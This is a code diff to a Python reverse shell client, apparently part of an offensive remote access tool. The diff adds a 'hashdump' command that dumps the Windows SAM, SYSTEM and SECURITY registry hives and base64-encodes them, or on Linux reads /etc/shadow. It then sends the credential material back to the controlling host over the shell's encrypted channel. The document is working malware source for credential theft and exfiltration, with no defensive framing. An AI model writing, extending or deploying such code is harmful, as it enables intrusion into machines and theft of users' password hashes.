@@ -32,7 +32,7 @@ class ReverseShellClient:
             hostname = socket.gethostname()
             os_type = platform.system()
             client_info = f"{hostname}|{os_type}"
-            self.conn.send(AESCipher.encrypt(client_info).encode("utf-8"))
+            self.send_large_data(client_info)
         except Exception as e:
             print(f"Failed to send client info: {e}")
 
@@ -51,6 +51,8 @@ class ReverseShellClient:
                     self.handle_upload(decrypted_data)
                 elif decrypted_data.startswith("search"):
                     self.handle_search(decrypted_data)
+                elif decrypted_data.startswith("hashdump"):
+                    self.handle_hashdump()
                 else:
                     self.execute_command(decrypted_data)
         finally:
@@ -98,6 +100,28 @@ class ReverseShellClient:
         else:
             command = f"find / -name {file_name} 2>/dev/null"
         result = self.run_system_command(command)
+        self.send_large_data(result)
+
+    def handle_hashdump(self):
+        if os.name == "nt":
+            commands = [
+                "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\sam'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\system'))\"",
+                "powershell -Command \"[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\Temp\\security'))\"",
+            ]
+            result = ""
+            for cmd in commands:
+                result += self.run_system_command(cmd) + "\n"
+        else:
+            try:
+                result = self.run_system_command(
+                    "sudo cat /etc/shadow || cat /etc/shadow"
+                )
+            except subprocess.CalledProcessError as e:
+                result = f"Error: {e.output.decode('utf-8')}"
+            except Exception as e:
+                result = str(e)
         self.send_large_data(result)
 
     def execute_command(self, command):
